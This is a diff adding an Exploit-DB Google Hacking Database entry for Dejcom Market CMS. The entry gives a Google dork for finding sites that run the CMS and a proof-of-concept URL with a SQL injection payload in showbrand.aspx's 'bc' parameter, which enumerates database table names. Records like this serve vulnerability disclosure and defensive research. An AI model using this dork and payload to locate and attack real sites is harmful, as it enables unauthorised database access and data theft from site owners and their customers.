@@ -1,0 +1,9 @@
+GHDB URL:         https://www.exploit-db.com/ghdb/3625
+Category:         Advisories and Vulnerabilities
+Published Date:   2010-12-04
+Author:           anonymous
+GoogleDork:       "Powered By Dejcom Market CMS"
+Description:      "Powered By Dejcom Market CMS"
+
+
+Submitter:Mormoroth PoC: http://server/showbrand.aspx?bc=%27 or 1=(select top 1 table_name from information_schema.tables where table_name not in('bill','billdetail','cart','charge'))--
